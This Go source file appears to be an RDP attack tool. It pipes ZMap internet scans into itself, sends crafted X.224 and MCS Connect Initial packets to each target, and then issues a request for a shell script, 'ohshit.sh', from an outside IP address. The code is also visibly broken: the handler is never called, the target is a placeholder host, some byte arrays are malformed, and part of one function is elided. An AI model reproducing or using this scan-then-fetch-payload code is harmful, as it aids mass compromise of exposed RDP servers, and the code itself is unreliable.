package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"time"
)

func main() {
	// Check if the command-line argument is provided
	if len(os.Args) < 2 {
		fmt.Println("Usage: ./RDP <port>")
		os.Exit(1)
	}

	port := os.Args[1]

	// Run ZMap command and pipe the output to the program
	zmapCmd := exec.Command("zmap", "-p", port)
	rdpCmd := exec.Command("./RDP", port)

	// Create a pipe to connect the stdout of ZMap to the stdin of the program
	rdpCmd.Stdin, _ = zmapCmd.StdoutPipe()

	// Start the RDP program
	err := rdpCmd.Start()
	if err != nil {
		fmt.Println("Error starting RDP:", err)
		os.Exit(1)
	}

	// Start the ZMap scan
	err = zmapCmd.Run()
	if err != nil {
		fmt.Println("Error running ZMap:", err)
		os.Exit(1)
	}

	// Wait for the RDP program to finish
	err = rdpCmd.Wait()
	if err != nil {
		fmt.Println("Error waiting for RDP:", err)
		os.Exit(1)
	}
}

// HandleRDPConnection handles the RDP connection on the specified port
func HandleRDPConnection(port string) {
	// Establish a connection
	targetHost := "example.com"
	targetPort := port

	// Create a socket
	clientConn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", targetHost, targetPort), time.Second*5)
	if err != nil {
		fmt.Println("Error connecting to the target:", err)
		return
	}
	defer clientConn.Close()

	// Send X224 request
	cr := NewX224ConnectionRequestPacket()
	_, err = clientConn.Write(cr.pdu)
	if err != nil {
		fmt.Println("Error sending X224 request:", err)
		return
	}

	// Send MCS GCC
	channels := []string{"channel1", "channel2", "channel3"}
	mcsci := NewMCSConnectInitialPacket(channels)
	_, err = clientConn.Write(mcsci.pdu)
	if err != nil {
		fmt.Println("Error sending MCS GCC:", err)
		return
	}

	// Send wget request
	wgetRequest := []byte("GET /ohshit.sh HTTP/1.1\r\nHost: 109.98.208.52\r\n\r\n")
	_, err = clientConn.Write(wgetRequest)
	if err != nil {
		fmt.Println("Error sending wget request:", err)
		return
	}

	// Receive response
	response := make([]byte, 4096)
	for {
		n, err := clientConn.Read(response)
		if err != nil {
			fmt.Println("Error receiving response:", err)
			return
		}
		if n == 0 {
			break
		}
		fmt.Print(string(response[:n]))
	}
}

// NewX224ConnectionRequestPacket creates a new x224 Connection Request packet
func NewX224ConnectionRequestPacket() *x224ConnectionRequestPacket {
	rdpNegReq := []byte{
		1, // type (TYPE_RDP_NEG_REQ), 1 byte
		0, // flags, 1 byte (fuzzable)
		8, // length, 2 bytes
		1, // request protocol, 4 bytes (fuzzable)
	}

	x224Crq := []byte{
		6 + len(rdpNegReq), // length indication, 1 byte
		224,                // CR -> 1110(E) CDT -> 0000(0) for class 0 and 1
		0,                  // dest-ref, 2 bytes (fuzzable)
		0,                  // src-ref, 2 bytes (fuzzable)
		0,                  // class 0
	}

	crTpdu := append(x224Crq, rdpNegReq...)

	tpktTotalLength := len(crTpdu) + 4

	tpktHeader := []byte{
		3,                          // version, 1 byte
		0,                          // reserved, 1 byte
		byte(tpktTotalLength >> 8), // len (including the header), 2 bytes
		byte(tpktTotalLength),
	}

	pdu := append(tpktHeader, crTpdu...)

	return &x224ConnectionRequestPacket{pdu: pdu}
}

// NewMCSConnectInitialPacket creates a new MCS Connect Initial packet
func NewMCSConnectInitialPacket(channels []string) *MCSConnectInitialPacket {
	var channelDefArray []byte

	for _, channel := range channels {
		channelDefArray = append(channelDefArray, []byte(channel)...)
		channelDefArray = append(channelDefArray, 0x00, 0x00, 0x00, 0x00)
	}

	clientNetworkData := append([]byte{
		0xc0, 0x03, // Header Type
		byte(len(channelDefArray) + 4 + 2 + 2>>8), byte(len(channelDefArray) + 4 + 2 + 2), // Header Length
		byte(len(channels) >> 8), byte(len(channels)), // channelCount
	}, channelDefArray...)

	// ...

	return &MCSConnectInitialPacket{clientNetworkData: clientNetworkData}
}

type x224ConnectionRequestPacket struct {
	pdu []byte
}

type MCSConnectInitialPacket struct {
	clientNetworkData []byte
}
